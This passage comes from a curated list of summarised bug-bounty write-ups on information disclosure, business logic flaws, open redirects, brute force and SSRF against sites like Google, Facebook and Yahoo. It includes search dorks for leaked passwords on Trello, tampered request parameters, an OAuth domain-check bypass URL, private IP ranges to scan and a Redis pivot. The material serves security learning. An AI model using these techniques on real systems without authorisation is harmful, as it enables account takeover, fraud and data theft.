    - He kept searching and searching new ways, and then all of a sudden, his power supply went off. He had already decided that he would somehow find a way to bypass this and that he was not ready to quit.
    - He took out his mobile phone and started searching in Google again. As he searched, just out of curiosity, he tried to open one of those IP addresses in his Google Chrome mobile browser. A page with "HTTP login" appeared in front of him.
    - However, he needed a username and password to get into it. He tried clicking the "Login" button without entering any credentials at all.
    - To his surprise, a page with many buttons and options appeared in front of him. It took him a minute to realize that he was inside a Google product's "admin panel".
    - After a few minutes, the power was back and he tried to open the same IP in his computer. But it wouldn't open. The "login page" never showed up.
  - Why was it working in his mobile phone browser and not in his laptop browser?
    - It was "Google's Data sever" that helped him to access their internal IPs. It was turned on in his Chrome mobile browser. This proxy acts as their access proxy and gave him access to their internal page. So after adding this proxy to his computer he was able to access the "admin panel" from his laptop browser as well.

  - While mapping out sub-domains of Yahoo, the author stumbled upon `https://bf1-uaddbcx-002.data.bf1.yahoo.com`. It wasn't behind a VPS just like other subdomains  of type `*.002.data.bf1.yahoo.com`. After opening the link it showed a "EMC page".
  - According to documentation: "EMC Unisphere presents a new approach to unified storage management through a simple, flexible, and integrated user experience. Information is consolidated and visible through a single lens and managing storage is simplified by providing an intuitive, context-based approach. Users can customize their view and easily reallocate data. Unisphere also provides users with an extensive network of support and collaboration with other users.".
  - The author clicked on "Start a new Unisphere seesion", however he kept stumbling on "JRE run time error" so he decided to shift his focus from that.
  - While brute force directories he got a 200 HTTP response code from `https://bf1-uaddbcx-002.data.bf1.yahoo.com/Debug/`.
    - It looked like Unisphere debug facility which was directly accessible.
    - He was able to tamper and have read / write / access to all the debugging options including the log files.
    - It also had a very insecure "login mechanism" which he was able to bypass.

- [Twitter's Vine Source code dump - $10080](https://avicoder.me/2016/07/22/Twitter-Vine-Source-code-dump/) by avicoder
  - While discovering subdomains, `censys.io` gave the author an interesting URL `https://docker.vineapp.com` in its result.
  - When he tried to access it via the browser, it shows `/* private docker registry */` in the response.
    - If it is supposed to be private, then why is it publicly accessible? There has to be some thing else to going on here.
    - On googling `/* private docker registry */`, the author get to know that the docker provides a functionality which allows a developer to host andshare images through the web.
  - However, since he wasn't too familiar with docker APIs, he faced some trouble while accessing images endpoints. The ones he could access, unfortunately, were not giving any useful results.
  - After figuring out that this "docker registry" is not using the latest version (V2) and the endpoints are different from previous ones, he needed to use V1 documentation to access them. Only after that was he able to get some useful response from the server.
  - The author also showed how he downloaded the source code.

  - The author initiated with reconnaissance and got few subdomains with "200 OK" response code, he chosed the one in dev environment as `dev.domain.com`. Using "dirbuster", he got `.git` folder in its directory with "403 Forbidden" error code.
    - He was curious to check if it was still possible to restore "git repositories" from this URL. Some developes hosted their version control repository (`.git`) in production which could lead an attacker to gain complete access to application's source code even when `.git` is "403 Forbidden".
  - The author started accessing some of the standard files in the "git repository" from the URL on the browser. He could access the following files: `/HEAD`, `objects/info/packs`, `description`, `config`, `COMMIT_EDITMSG`, `index`, `logs/HEAD`.
  - Then he downloaded the code repo.

  - The author discovered a subdomain during his recon process, a PHP file with error message containing an URL pointing to `mongolab.com` and an "Api Key" in this URL.
  - The author even didn't kown what is mongolab. He read the document and accessed the URL `https://api.mlab.com/api/1/databases?apiKey=<KEY>`, databases was printed.
    - He played with the resources provided by the documentation and finally got username, email, password.

  - The author found that a lot of individuals and companies are putting their sensitive information on their public "Trello" boards. Information like unfixed bug and security vulnerabilities, the credentials of their social media account, email account, server and admin dashbords, etc, is available on their public "Trello Boards" which are being indexed by all the search engines and anyone can easily find them.
  - "Trello" is an online tool for managing project and personal tasks. And it has "Boards" which are used to manage those projects and tasks. The user can set the visibility of their boards to private or public.
  - Search queries revealed "Trello Boards" containing sensitive information such as:
    - the passwords for Gmail accounts: `inurl:https://trello.com AND intext:@gmail.com AND intext:password`
    - the passwords for SSH: `inurl:https://trello.com AND intext:ftp AND intext:password`
    - the passwords for FTP: `inurl:https://trello.com AND intext:ssh AND intext:password`
  - The author kept on changing his search query. And found some companies use public "Trello Boards" to manage bugs and security vulnerabilities found in their applications and websites. People also use public "Trello Boards" as a fancy public password manager for their organization's credentials.
  - Nine hours after the author discovered this thing, he had found the contact details of almost 25 companies that were leaking some very sensitive information.

### Business Logic Flaw

- [Facebook - bypass ads account's roles vulnerability 2015](https://blog.darabi.me/2015/03/facebook-bypass-ads-account-roles.html) by POUYA DARABI
  - "admins" in "ad account" can add any user to their "ad account" with 3 types of role: "admin", "advertiser", "analyst".
  - In "Facebook business manager", a "business account" can assign agencies for own "ad accounts" so that agencies give access to "ad accounts" with limited access (owner set this access in assign agency process).
  - The author had a "business account" and he gave "analyst" permission to another "business account" to work on his "ad account", the "business account can bypass roles and get "admin" access. With "analyst" permission in any "ad account" sent a request:
    - reuqest url: `facebook.com/ads/manage/settings/permissions/?action=add_user`
    - request body: `act:[ad_account_id], user_id:[user_id], add_user_permission:[permission: 1001 admin, 1002 advertiser, 1003 analyst ]`
  - The author gave a XHR proc (that is worth to study).
- [How I Could Have Promoted Any Facebook Page For Free](https://medium.com/bugbountywriteup/how-i-could-have-promoted-any-facebook-page-for-free-70b0f4fc0feb) by AneesKhan
  - An "ongoing promotion" is a type of ad you create from your "Page" that runs continuously, unless you decide to pause or stop it.
  - The author created a "Facebook Page" and uploaded some images to it. There was an option called "Boost Post" below every image. When he clicked on "Boost Post", facebook asked him to add a Valid Card for the transaction, so he filled up the form (the author only had 4 to 5 US Dollars in his card but he started an ad for 100000 PKR which is almost 1000 USD) and then "Continue".
    - The response said the the Post was under review. The author thought that Facebook might have a manual check or review and he might be blocked. But after a couple of minutes he recieved a notification said that "Your ad has been apporved".
    - A couple of hours later, he checked again and found his Post reached 34,792 people and got 7.1k Likes.
    - But all of a suddent his ad stopped.
  - The author managed to sort out this functionality by reading their blogs and other stuff (read document!).
    - When we Boost a Post in Facebook, then at that time it doesn't charge the money from our card, but instead it saves the money in our account that we need to pay later and it is named as "Threshold Amount".
    - But the threshold has got its limit. So when our boosted Post reaches the limit of 2500 PKR (20-25 Dollars), then the ad will be automatically stopped and it will be started again after paying that amount.
  - The author tried to change the "Threshold" limit but it didn't work. He then tried lots of different methods to bypass "Threshold" protection, but in vail.
  - After a couple of days, he came an idea to change the ownership of that page, so he changed the admin of that page and removed the previous admin. Worked. By doing the same process, he could have boosted up as many posts as he could.
- [Facebook Bug Bounty! {Permission Bug}](https://medium.com/@alicanact60/facebook-bug-bounty-permission-bug-19c9358d2297) by alicanact60
  - The author watched a "proof of concept video" and it gave him an idea. When he went to app's roles, he saw permissions: tester can't access app's insights. So he tried the following steps:
    - Go to `https://developers.facebook.com/apps` and create a app.
    - Go to `https://developers.facebook.com/apps/{App Id}/roles/roles/` and add a tester.
    - Login with your tester account.
    - Go to `https://www.facebook.com/insights`, but see nothing.
    - After a thought, the author went to `https://facebook.com/analytics/{App Id}`. He saw all analytics and he could have edited them.

- [How I hacked Google’s bug tracking system itself for $15,600 in bounties](https://medium.freecodecamp.org/messing-with-the-google-buganizer-system-for-15-600-in-bounties-58f86cc9f9a5) by Alex Birsan
  - "Google Issue Tracker" is only used by Google employee or a developer who recently reported bugs in Google tools. However the author noticed his vulnerability reports were now being handled by opening a new thread there, in addition to he ususal email notifications. So he immediately started trying to break it.
  - "Issue Tracker" (internally called "Buganizer System") is a tool used in-house at Google to track bugs and feature requests during product development. It is available outside of Google for use by external public and partner users who need to collaborate with Google teams on specific projects. In other words, when someone has an issue with Google product, it goes in the "Issue Tracker".
    - We, as external users, only get to see the tip of the iceberg: A small set of pre-approved categories, and issues where someone at Google explicitly added an external account, such as vulnerability reports. But how much information lies under the surface.
    - By observing numerical IDs assigned to the latest public threads, we can easily estimate how much usage this tool gets internally. There are about 2000-3000 issues per hour being opened during the work hours in Mountain View, and only 0.1% of them are public. Seems like a data leak in this system would have a pretty big impact.
  - Getting a Google employee account.
    - One of the first things the author noticed upon discovering the "Issue Tracker" was the ability to participate in discussions by sending emails to a pecial address, which looks like this: `buganizer-system+componentID+issueID@google.com` (in which `componentID` is a number representing a category, and `issueID` is an unique identifier for the thread you are responding to).
    - This reminded him of a finding which allowed hackers to infiltrate into organizations's chat systems by leveraging this kind of email system. Considering that this is a `@google.com` email address, he tried signing up to "Google's Slack team" using it, and the confirmation page he got looked very promising.
    - The next best thing he could think of was getting a "Google account" with `@google.com` main email address, which would hopefully give him some extra privileges on the Buganizer. Registering such an account from outside Google was not supposed to be allowed.
    - However, he found a method to bypass this filter: If he signed up with any other fake email address, but failed to confirm the account by clicking on a link received by email, he was allowed to change his email address without any limitations. Using this method, he changed the email of a fresh Google account to `buganizer-system+123123+67111111@google.com`.
    - Soon after, he received the confirmation email as a message on the corresponding issue page.
    - He clicked the confirmation link, logged in on the "Issue Tracker", he got redirected to the corporate "login page". And his Google account credentials did not work there.
    - Nevertheless, this account gave him a lot of extra benefits in other places across the internet, including the ability to hitch a ride (for free, maybe?), so it was still a security problem that opened a lot of doors for malicious users.
  - Getting notified about internal tickets.
    - Another "Issue Tracker" feature that caught his eye while getting familiar with the UI is the ability to star items. Starring an issue means you're interested in the problem being discussed and you want to receive email notifications whenever someone adds a comment.
    - The interesting thing he noticed about this functionality was the distinct lack of errors when trying to use it on issues he did not have access to. He logged in to his second account and tried to star a vulnerability report from his main account by replacing the "Issue ID" in the request. He then saw a message "1 person has starred this issue", which means the  action had been successful.
    - Could it be that easy to spy on open Google vulnerabilities? He quickly posted a comment on the issue to see if his fictional attacker account would get notified about it. No email ever showed up.
    - He decided to do some further testing on this one. So he got a recent issue ID, and extrapolated a range of a few thousand IDs which should coincide with the latest issues in the database. He then starred them all. In a matter of minutes, he got many notification emails.
    - His first thought when opening the inbox was "Jackpot". However, upon closer inspection, there was nothing particularly interesting going on in those threads. Apparently, he could only eavesdrop on translation-related conversations, where people would debate the best ways to convey the meaning of a phrase in different languages.
    - The author even considered not reporting this for a few hours, hoping he would find a way to escalate the severity. In the end, he realized that the Google security team would probably be interested in finding possible pivot methods and variants, so he sent out the details.
  - Getting details about every issue.
    - When you visit the "Issue Tracker" as an external user, most of its functionality is stripped away, leaving you with extremely limited privileges. If you want to see all the cool stuff Google employees can do, you can look for API endpoints in the Javascript files. Some of these functions are disabled completely, others are simply hidden in the interface.
    - There was a method for us remove ourselves from the CCs list, in case we lose interest in an issue or don't want to receive emails about it any more. This could be achieved by sending a POST request containing `issueIds` and `actions`. However, the author noticed some oversights here that led to a huge problem.
    - Improper access control: There was no explicit check that the current user actually had access to the issue specified in the `issueIds` before attempting to perform the given action.
    - Silent failure: If you provided an email address that was not currently in the CCs list, the endpoint would return a message stating the email had been removed successfully.
    - Full issue details in response: If no errors occurred during the action, another part of the system assumed that the user ahd proper permissions. Thus every single detail about the given `issueIds` would be returned in the HTTP response body.
    - The author could now see details about every issue in the database by replacing `issueIds` in the POST request. Even worse, he could exfiltrate data about multiple tickets in a single request, so monitoring all the internal activity in real time probably wouldn't have triggered any rate limiters.
- [I bypassed "How I hacked Google’s bug tracking system itself for $15,600 in bounties." Here’s how](https://medium.freecodecamp.org/i-bypassed-how-i-hacked-googles-bug-tracking-system-itself-for-15-600-in-bounties-here-s-how-3355c8c63955) by Gopal Singh
  - The author came across this previous writeup, so he started testing he "Issue Tracker", and he was trying to see of he could get a Google accout.
  - Looking around in "Issue Tracker", he noticed in the browse components there were two public issue trackers. So he clicked on "Android Public Tracker".
    - He could see bugs reported to Android there. To report a bug in "Android Public Issue Tracker", you can send a email to `buganizer-system+componentID@google.com` (where Android's `compponentID` is 190923).
    - He could see that his issue got listed in the "public Issue Tracker". He got a confirmation email from `buganizer-system+my_email@google.com`. A reply to this email would be directed to `buganizer-system+componentID+issueID@google.com`.
    - He responded to that email, and a comment was posted in the conversation. He could add a Google email to see if he could get a "confirmation code". To test this he clicked on "Forwarding and POP / IMAP" in Gmail settings and added the Google email to the forwarding email address. He was surprised to see he got a "confirmation code" in the "Android Public issue tracker".
    - There are two parts here to get a Google account "Signup" and "verification". He could verify a Google account, but he could not signup for an `@google.com` account, so his report was closed as "Won't Fix".
    - The author almost gave up, because after the initial fix he could not use his `@google.com` email. But he decided to give it one last try.
    - He started visiting every subdomain of Google to see if he could use a `@google.com` email to signup. A new signup page appeared. Initially, he could not find "Use my current email address instead" to get it to go to `https://partnerissuetracker.corp.google.com/`. Then you would click on "Create an account", and you could see there was an option to use your current email address.
    - He began to sign up using the `buganizer-system+componentID+issueID@google.com` email and then it asked him to verify by entering the code. He was waiting for the verification code in the conversation, and then he received the verification code in the email and the conversation in the issue tracker.
    - The impact here was that you can access `https://google.ridecell.com` which requires a Google account. Besides this, he tried to upgrade his account to Gmail now as he had a Google account. He added it to his Gmail, and he was able to send an email using from `buganizer-system+componentID+issueID@google.com`.
- [Bypassing Google Authentication on Periscope's Administration Panel](https://whitton.io/articles/bypassing-google-authentication-on-periscopes-admin-panel/) By Jack Whitton
  - "Periscope" is an iOS / Android app, owned by Twitter, used for live streaming. To manage the millions of users, a web-based administration panel is used, accessible at `admin.periscope.tv`.
  - When you browse to the site, all requests are redirected to `/auth?redirect=/` (since we don't have a valid session), which in turn redirects to Google for authentication.
    - `https://accounts.google.com/o/oauth2/auth?access_type=&approval_prompt=&client_id=57569323683-c0hvkac6m15h3u3l53u89vpquvjiu8sb.apps.googleusercontent.com&hd=bountyapp.co&redirect_uri=https%3A%2F%2Fadmin.periscope.tv%2Fauth%2Fcallback&response_type=code&scope=https%3A%2F%2Fwww.googleapis.com%2Fauth%2Fplus.login+https%3A%2F%2Fwww.googleapis.com%2Fauth%2Fuserinfo.profile&state=%2FStreams`
    - The redirected URL contained various parameters, but the most intesting one was `hd`. This was used to restrict logins to a specific domain, in this case `bountyapp.co`.
    - If we try and login with an account such as `test@gmail.com`, we're redirected back to the account selection page, and if we try again we get redirected back to the same place, and so on.
  - We can simply remove the `hd` parameter. There's no signature in the URL to prevent us from making modifications, and as indicated in the documentation, the "onus" is on the application to validate the returned token.
    - `https://accounts.google.com/o/oauth2/auth?access_type=&approval_prompt=&client_id=57569323683-c0hvkac6m15h3u3l53u89vpquvjiu8sb.apps.googleusercontent.com&redirect_uri=https%3A%2F%2Fadmin.periscope.tv%2Fauth%2Fcallback&response_type=code&scope=https%3A%2F%2Fwww.googleapis.com%2Fauth%2Fuserinfo.profile&state=%2FStreams`
    - The author also removed the Google+ scope, this was purely because his test account wasn't signed up for it.
  - Browsed to this new URL prompts us to authorise the appliction. After clicking "Accept" button, a redirect is issued back to the "administation panel", with our `code` as a parameter.
    - This was where the application should then exchanged the code for an "access token", and validate the returned "user ID" against either a whitelist, or at the very least verify that the domain is `bountyapp.co`.
    - But in this case, the assumption is made that if you managed to login, you are an employee with an `@bonntyapp.co` email.
  - The requested `userinfo.profile` permission didn't contain the user's email address, so the appplication couldn't validate it if it tried. This then presented us with the "admin panel".
  - Fixes:
    - Request an additional permission: `https://www.googleapis.com/auth/userinfo.email`.
    - Correctly validate the user on callback.

  - The author started his Bug Bounty Journey on `yahoo.com.hk` first, it didn't went well for a month, but after he read a book "The Web Application Hackers Handbook", he suddenly realize there might be a multistage logic flaw during "Yahoo Deals" checkout process, so he decided to take a look and fuzz around and see what things could go wrong in the process.
  - "Yahoo Deals", "Yahoo Shop", "Yahoo Auctions", are quite premium service in Hong Kong, they provide a platform that allows user to trade items with "Yahoo Payment" system.
  - The author started to buy an item at `hk.shop.yahoo.com` and he followed along the process and monitored the traffic by Burpsuite. When he checked on the "checkout" traffic, he saw `paymentAmount` was sent in plain test.
    - He confirmed Yahoo validated the `paymentAmount` by changing the `paymentAmount` to other values. He could find a way to bypass its validation on price.
  - The author then reached the part where he would redirect to a third party payment system to finish his credit card payment. After redirection, there was `amount` in Referer and POST parameters, the `amount` once again transmitted in plain text. He changed `amount` to other vaules, worked.

  - The author searched for a sharing apartment in a home rental site. He loved a house and thought of paying the advance. He was desperately hunting for a payment gateway vulnerabilities from past few weeks, so he thought of giving a try on this site.
  - Tha author captured the request before it hit the payment gateway, changed the `orderAmount` in POST parameters, and forwarded the request. It redirected him to a payment gateway (Citrus Pay) page.
  - After clicking on "Pay Now" button, he captured the request and changed many parameter values from `False` to `True`, but no luck. After so many unsuccessful attempts he got the right one. He changed the `retryCount` from "0" to "positive value", then it took him to the next page successfully. There it asked him for his contact details and his credit card detail to pay the amount of 1.00 INR.
  - When the author cancelled the house which he booked, he got the refund of 7291.0 INR instead of 1.0 INR which he actually paid.
- [How I was able to get subscription of $120/year For Free](https://blog.securitybreached.org/2018/05/18/get-subscription-of-120-year-for-free-bug-bounty-poc/) by babayaga47
  - "WeTransfer Plus" subscription was $120/year. The author decided to test "weTransfer" for any possible vulnerability that can result of him bypassing their payment system or getting a "Plus" subscription for completely free.
  - The author first tried changing "amount" in HTTP request, etc, but no such method worked.
  - Then he google "wetransger plus free" just to see if there was any promo going on that he could use or can misuse to get access to "WeTransfer Plus" for free. He saw that they were giving free 1 year "Plus" subscription to students if they signup for account using their educational institutes email (with `.edu` domain).
  - The author put an email with `.edu` domain, it said "We have just sent you an email, with a link to get your free WeTransfer Plus accout". He didn't own that email and couldn't get he link. So he checked how the email was sent to user and what might have in it.
  - Nothing special in the POST request, but the response contains a code like `{"code":"9e0bca0a6d92"}`, this `code` shuld be sent to the email with a link but instead HTTP response leaked the code that was generated by API for that particular `.edu` email.
  - The next issue was how to use that `code` or how could he validate that code if it worked or not, as no signup page or no setting area contained a field to add a "coupon code".
  - After a bit checking, the author found a way to use that "coupon", it was pretty simple:
    - Go to `https://wetransfer.com/plus` and select "Annual subscription" that cost "120 USD", fill in your details, intercept the request.
    - Edit the POST parameters and add `"coupon_code":"9e0bca0a6d92"`. Worked.
- [How I got paid premium plan for free on many popular websites](https://medium.com/@khaled.hassan/how-i-got-paid-premium-plan-for-free-on-many-popular-websites-90e62a52416a) by Khaled Hassan
  - One of the most important recon steps to the author is reading the website products, blogs, support portal, engineering blog, etc. So what caught his attention is some popular websites offers paid premium plan to students for free.
  - When you find a website that offer education plan, You'll find that they usually process student requests applications throught two ways:
    - The first way is processing students applications manually. You as student to get this free education plan, you should submit your university ID to their email address and someone from the team will review your application, and after that he will enable the education plan on your account.
    - Second way, some websites and the most are processing student plan verification automatically. This simply happens by registering your account with emails like `khaled.hassan@harvard.edu` and when you verify your email, education plan will be enabled on your account directly. So emails that ends with `.edu` domain is only accepted.
  - The author was reading the support articles of a private program and he found them worte that any student can get their gold premium plan for free (this plan worth $1500 per month). Then he clicked on `https:// redacted.com/edu`.
  - Soon he found that you can't register your account through this page otherwise with emials like `khaled@harverd.edu`, and after you sign up successfully, website will send a confirmation link to your email and you can't access the website without it.
    - After trying to access the account he registered without the confirmation link, this didn't work and he thought on another way to bypass.
  - A feature on this website: when you register an account on the website, you can create your own workspace / company profile on your account and invite others to collaborate with you to design together. The author tried to invite his test account to his own company, and received the following invitation link:
    - `https://redacted.com/signup/invite?id=4d0940077e1443a78c29da51`
    - When you create your account through this invitation link, website will not require from you to confirm your email because its already confirmed by the invitation link.
  - After he opend the invitation link, he found that his invited email address was being reflected on the signup page.
    - What based on the email address gets printed on the page? and what if changed the "invitation token" parameter to the ID of any user? Maybe we could get email disclosure vulnerability?
  - The author sent a GET request to server to list the "account ID" of his test account he have invited to his company.
    - `https://redacted.com/api/companies/9129600280152c09ef1dd588/` (the string in this URL was "account ID"?)
    - The response contained `entryId` parameter which was the ID of invited user.
  - Then he replaced the "invitation token" in the URL with `entryID` of the invited test account. So the final URL would be:
    - `https:// redacted.com/signup/invite?id=5b209840ddb3290f4d5f4be4`
    - The application was still printing the email of invited account on the page. That meant the author have a valid "invitation token".
  - The author bypassed the email verification of education accounts through replacing "invitation token" with `entryID` parameter value.
  - Fixed: the website converted processing students application from automatically to manually method like the rest websites.
- [Accidentally typo to bypass administration access](https://blog.yappare.com/2017/08/accidentally-typo-to-bypass.html) by yappare
  - This was from a private program. This program offers $15000 in total. There were several targets given, but most of them were limited in term of functionalities and forms.
  - One of the application in scope attracted the author as it responded differently if viewed in a different browser's platform. Which means, you will only allowed to access their "mobile site" if the application detected your "user agent" is coming from mobile. This application just consist of few functionalities such as "query for available item", "view for available schedule", "information of the certain item", "no login".
  - The author spent few days looking on their "desktop website" and found few XSS. Looking at the "source page" of the website, he noticed there was a script that contain a hyperlink to a "mobile site". The author changed his "user agent" and accessed the site.
    - He found another few XSS. Considering the current findings, he is probably will be rewarded up to $2000 in total.
    - Then something is bothering him where from his Burpsuite's request, there is a "302 redirect response" whenever the "Spider" tried to access `/admin` path.
    - He tried to check if there's any JS files that he could use to bypass this thing. No success.
    - During the testing, he mistakenly typed the `/admin` into `/Admin`, then he was able to access into the "administration page". It seems there was a weak configuration at their backend which only restrict access for `/admin`, but not if the word contain at least one capital letter. `/Admin`, `/aDmin`, `\ADMIN` all of these words can be used to bypass the check.
  - Takeaways:
    - Do not forget to test target's mobile site.
    - Do not give up if the application looks really simple, there's probably a hidden "administration page" in it.
- [Chaining Multiple Vulnerabilities to Gain Admin Access](https://nahamsec.com/chaining-multiple-vulnerabilities-to-gain-admin-access/) by NahamSec
  - The author showed how he broke the app step by step.
  - Takeaways:
    - Recon doesn't necessarily mean gathering subdomains and file / directory listing, it is also understanding what and how the application does what it's supposed to do.
    - Looks could be deceiving: What may seem like an unsuccessful attempt, may have partially worked. With that said, don't rely on error messages and try to confirm things on your own.
    - 2FA doesn't mean a dead end: We are all human and we all make mistakes, so try and put yourself in the developers shoes and think of where / what could you have possibly done wrong.
    - If you can't find a bug on your first attempt, give it some time and go back to your target with a fresh new set of eyes.
    - Chain bugs for a bigger payout.
    - Do not give up.

### Open Redirection

- [Use Two Open Redirects to Trigger an XSS in Google website - Open redirects that matter](https://sites.google.com/site/bughunteruniversity/best-reports/openredirectsthatmatter) by Tomasz Bojarski
  - This is a complicated writeup writen by Google security engineer, with detailed techques analyzing.
  - The writer started with the report, analyzing how the proc finally was triggered. The reader could even read the source code of the website.
  - To bypass the prefix check, using `https://picasaweb.google.com/data/feed/api/../../../bye`.
  - To bypass the prevention of MIME sniffing vulnerabilities, triggering an error. The error message should contain HTML code.
  - Open redirects are super useful in bug chains, especially when used to bypass a prefix-based URL whitelist.
  - It's also useful to set up your own server to respond with various invalid header valuse, as not everything can be tested using a tampering proxy alone.

  - The author found an "open redirect" on `site.com`. "open redirect" is basically not a high impact vulnerability, but his opinion for a site like `https://site.com`, "open redirect" can high-level impact because `https://site.com` is a payment processing service. If an attacker can redirect the user to any malicious website, then the attacker can also maintain a phishing website for the victim to get the credentials of `https://site.com` account or their "API keys".
  - This was an "open redirect" in login service.
    - Normal: `https://www.site.com/login?service=https%3A%2F%2Fwww.site.com%2Fva`.
    - Poc: `https://www.site.com/login?service=https%3A%2F%2Fwww.google.com%2Fva`, worked.

### Brute Force

- [How I could have hacked all Facebook accounts](http://www.anandpraka.sh/2016/03/how-i-could-have-hacked-your-facebook.html) by Anand Prakash
  - The author found a simple vulnerability on "Facebook" that could gave him full access of another users account by setting a new password.
  - Whenever a user forgets his password on "Facebook", he has an option to reset the password by entering his "phone number" / "email address" on `https://www.facebook.com/login/identify?ctx=recover&lwv=110`, "Facebook" will then send a 6 digit code on his "phone number" / "email address" which user has to enter in order to set a new password.
    - The author tried to brute the 6 digit code on `www.facebook.com` and was blocked after 10-12 invalid attempts.
  - Then he looked out for the same issue on `beta.facebook.com` and `mbasic.beta.facebook.com` and rate limiting was missing on forgot password endpoints. He tried to takeover his account (as per Facebook's policy you should not do any harm on any other user account) and was successful in setting new password for his account. He could then use the same password to login in the account.
  - The author deliberately looked out this kind of vulnerability.
- [Facebook Account Take Over](https://arunsureshkumar.me/index.php/2016/04/24/facebook-account-take-over/) by Arun Sureshkumar
  - This vulnerability was the same as the previous one, but on a different "Facebook" endpoint `https://lookaside.facebook.com`.
  - When the author reported the bug to "Facebook", they rejected it by saying that they can't reproduce the issue. He provided several PoCs to prove that it was a valid bug.
- [How I Could Compromise 4% (Locked) Instagram Accounts](https://www.arneswinnen.net/2016/03/how-i-could-compromise-4-locked-instagram-accounts/) by Arne Swinnen
  - "Missing authentication" combined with a simple "IDOR" vulnerability allowed to overtake a selection of "temporary locked Instagram accounts".
    - An extrapolation of the PoC account range learned that 4% of all existing & active "Instagram accounts" (approx. 500 million) were in a vulnerable locked state (approx. 20 million).
  - It was a while ago that the author actually hunted for vulnerabilities in Instagram when he logged back in to one of his test accounts. After providing valid credentails, he was immediately redirected to a page which told him he had to verify his account (probably due to inactivity). The option that was offered to him was to verify by email, as he didn't link any phone number to that account yet.
    - `https://www.instagram.com/integrity/checkpoint/checkpoint_logged_out_main/2280861430/?ne...`
    - The URL revealed the issue: this page was actually accessible without being authenticated (`checkpoint_logged_out_main`) and contained his Instagram test account's unique "user id" (`2280861430`).
    - Even if he were able to land on the same "Verify by Email" page of other accounts, it would have no direct security impact, as he don't have access to his victim'a email addresses.
  - An enumeration of one million accounts in the range 2000000000-2001000000 (Instagram has incremental user ids) yielded the following results:
    - Verify account via Captcha (1099 accounts ~ 0.1%): these might have been accounts that were abserved to perform spamming. No direct security impact.
    - Verify account via email / SMS (1960 accounts ~ 0.2%): yet no direct security impact.
    - Update email address & verify account (1690 accounts ~ 0.17%): this page allowed the author to update the email address of temporary locked account. Once an attacker could set the email address linked to an "Instagram account", he / she could perform a password reset via email and gain full access to it. Big security impact.
    - Update phone number & verify account (38808 account ~ 3.88%): this case was the most troublesome, as an attacker could on one hand gather sensitive user information (pre-filled phone number in some cases), and on the other hand simply update the phone number linked to the victim "Instagram account". After successfully linking a new phone number, an attacker could perform the "reset password via SMS" scenario and gain complete access to the account. Big security impact.
  - The author didn't actually takeover any other users' account.

  - While the author was testing the web application he found a self-XSS which had no impact. But he wanted to exploit this vulenrability, so he decided to chain the self-XSS with some other vulnerability.
  - So he started looking for CSRF attack, but he didn't get CSRF on the vulnerable page.
  - The author noticed that application was not using the `x-frame` header, so he thought "click jacking".
  - The author changed self-XSS with "click jacking" to grab victim's cookies and gave the poc.

### Server Side Request Forgery (SSRF)

- [HOW TO: SERVER-SIDE REQUEST FORGERY (SSRF)](https://www.hackerone.com/blog-How-To-Server-Side-Request-Forgery-SSRF) by Jobert
  - SSRF is a vulnerability class that describes the behavior of a server making a request that's under the attacker's control. It happens that an online application requires outside resources. For example, when you's tweet a blog post, a avatar would show up for that post on Twitter. The image, title, and description come frome the HTML that his page returns. In order to download that information, a Twitter server makes an HTTP request to that page and extracts all the information it needs. 
  - A good demonstration of an SSRF vulnerability is to reveal a system that is not accessible over the internet. Whenever you want to achieve this, keep the program's policy in mind and don't overstep any boundaries. If you do want to look for internal services, here's a list of private IPv4 networks that you could scan for services:
    - `10.0.0.0/8`
    - `127.0.0.1/32`
    - `172.16.0.0/12`
    - `192.168.0.0/16`
  - To discover which networks are routed internally, try looking at the time difference in responses.
    - Unrouted networks are often dropped by the router immediately (small time increase).
    - Internal firewalling rules often cause routed networks to increase the RTT (bigger time increase).
    - Also, remember that routers and switches often have an HTTP or SSH interface enabled, so it often pays off to try `.1` and `.254` addresses on port `22`, `80`, `443`, `8080`, and `8443` first.
  - More and more companies host part of their infrastructure on Amazon EC2. Amazon exposes an internal service every EC2 instance can query for instance metadata about the host.
    - Here's the [AWS documentation](https://docs.aws.amazon.com/AWSEC2/latest/UserGuide/ec2-instance-metadata.html).
  - Not all SSRF vulnerabilities are using the HTTP protocol. Sometimes, it's possible to either specify a different protocol or switch protocols with a redirect.
    - A cool pivot to escalate the SSRF to RCE is by pushing asynchronous jobs on the "Redis" queue that then get executed by an application using the `gopher://protocol`. It's really convenient that a lot of "Redis" instances don't use any form of authentication.
- [SSRF to query google internal server](https://www.rcesecurity.com/2017/03/ok-google-give-me-all-your-internal-dns-information/) by rcesecurity
  - A SSRF vulnerability on `toolbox.googleapps.com` which could be used to discover and query internal Google DNS servers to extract all kinds of corporate information like used internal IP addresses across the company as well as A and NS records exposing all kinds of hosts like Google's Active Directory structures and also a fancy Minecraft server.
  - "G-Suite Toolbox" can be used to perform all kinds of trouble-shooting. Among all the availabe tools, there is one called "Dig" which on Linux can be used to query a DNS server for its records of a given domain, just like A- or MX records.
  - If you filled "Name server" with `127.0.0.1`, you were trying to query `127.0.0.1` for DNS records, the web application simply responds with a "Server did not respond" message. So it really looks like the tool is trying to connect to `127.0.0.1:53` to fetch the DNS information for his domain, this smells like a SSRF (Think twice on error message).
  - Used Burpsuite's intruder to brute-force IP addresses ("nameserver" in POST parameter), the author found one promising internal IP, which responded to the request, however just with an empty A recored for his domain. Since the author knew about his own domain very well, it's even more interesting to find out whether it's possible to extract some internal information from Google, which are not publicly available.
  - Google is using `corp.google.com` as their corporate domain. Now you could brute-force all subdomains of `corp.google.com` using the very sam POST request to discover more subdomains.
  - The author used his own domain to brute-forece IP address and found a Google internal DNS, then used the Google internal DNS to extract Google internal information.
  - The product feature is related to this vulnerability.
- [Into the Borg – SSRF inside Google production network](https://opnsec.com/2018/07/into-the-borg-ssrf-inside-google-production-network/) by Enguerran Gillier
  - "Google Caja" is a tool to securely embed arbitrary html / javascript in a webpage.
  - "Google Caja" parses html / javascript and modifies it to remove any javascript sensitive content, such as iframe or object tafs and javascript sensitive properties such as `document.cookie`. "Caja" mostly parses and sanitizes HTML tags on the client side. However, for remote javascript tag (`<script src="xxx">`), the remote resource was fetched, parsed and sanitized on the server-side.
  - The author tried to host a javascript file on his server (`https://attacker.com/script.js`) and check if the Google Sites server would fall for the XSS when parsed server-side, but the server replied that `https://attacker.com/script.js` was not accessible.
